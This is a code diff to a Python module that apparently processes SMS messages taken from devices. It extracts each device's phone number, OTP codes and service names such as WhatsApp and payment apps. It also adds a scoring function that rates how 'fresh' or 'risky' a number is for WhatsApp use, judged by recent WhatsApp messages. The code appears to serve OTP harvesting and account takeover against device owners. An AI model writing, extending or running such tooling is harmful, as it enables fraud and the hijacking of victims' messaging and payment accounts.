@@ -1,5 +1,5 @@
 import aiohttp, json, re, base64, time
-from datetime import datetime, timedelta
+from datetime import datetime
 
 async def fetch_fb(url, auth=None):
     full_url = url
@@ -96,6 +96,30 @@ def _is_service_sender(sender):
     s = sender.strip()
     return bool(_RE_SHORTCODE.match(s) or _RE_DLT_ID.match(s) or _RE_ALNUM_ID.match(s))
 
+def get_ws_chance(msgs):
+    ws_msgs = []
+    now = time.time()
+    for m in msgs:
+        if not isinstance(m, dict): continue
+        text = (m.get("message") or "").lower()
+        sender = str(m.get("sender") or "").lower()
+        if "whatsapp" in text or "whatsapp" in sender:
+            ts = 0
+            try:
+                iv = int(m.get("id", 0))
+                if iv > 10**12: ts = iv / 1000
+            except: pass
+            if ts: ws_msgs.append(ts)
+    
+    if not ws_msgs: return 97 # Fresh line
+    
+    latest_ws = max(ws_msgs)
+    diff_hours = (now - latest_ws) / 3600
+    
+    if diff_hours > 24: return 97 # Cooldown passed, fresh again
+    if diff_hours < 1: return 96 # Very recent
+    return 70 # In between, slightly risky
+
 def extract_best_numbers(dev_data, msgs):
     if not isinstance(dev_data, dict): dev_data = {}
     candidates = {}
@@ -103,22 +127,17 @@ def extract_best_numbers(dev_data, msgs):
         if not num: return
         if candidates.get(num, -1) < conf: candidates[num] = conf
 
-    # 1. mobNo (100% real)
     bump(_clean_mobile(dev_data.get('mobNo')), 100)
-
-    # 2. sims array
     for sim in (dev_data.get('sims') or []):
         if isinstance(sim, dict): bump(_clean_mobile(sim.get('phoneNumber')), 100)
 
     if msgs:
-        # 3. Carrier self-mention
         for m in msgs:
             if not isinstance(m, dict) or m.get('type') != 'incoming': continue
             body = m.get('message', '') or ''
             for pat in _CARRIER_PATTERNS:
                 for hit in pat.findall(body): bump(_clean_mobile(hit), 100)
 
-        # 4. Frequency of real-mobile senders
         freq = {}
         for m in msgs:
             if not isinstance(m, dict) or m.get('type') != 'incoming': continue
@@ -144,12 +163,8 @@ def extract_otp(text):
 
 def extract_service_name(text, sender):
     text_lower = text.lower()
-    services = {"whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram", "telegram": "Telegram", "amazon": "Amazon", "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato", "paytm": "Paytm", "jio": "Jio", "airtel": "Airtel", "meesho": "Meesho", "tezcredit": "TezCredit", "creditt": "Creditt", "phonpe": "PhonePe", "tatacl": "TataCL", "canva": "Canva"}
+    services = {"whatsapp": "WhatsApp", "telegram": "Telegram", "facebook": "Facebook", "instagram": "Instagram", "amazon": "Amazon", "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato", "paytm": "Paytm", "jio": "Jio", "airtel": "Airtel", "meesho": "Meesho", "tezcredit": "TezCredit", "creditt": "Creditt", "phonpe": "PhonePe", "tatacl": "TataCL", "canva": "Canva"}
     for key, name in services.items():
         if key in text_lower: return name
     if sender and "-" in sender: return sender.split("-")[1]
     return "Unknown"
-
-def get_ist_time_str(ts):
-    ist = datetime.utcfromtimestamp(ts) + timedelta(hours=5, minutes=30)
-    return ist.strftime("%d %b %Y | %I:%M %p")
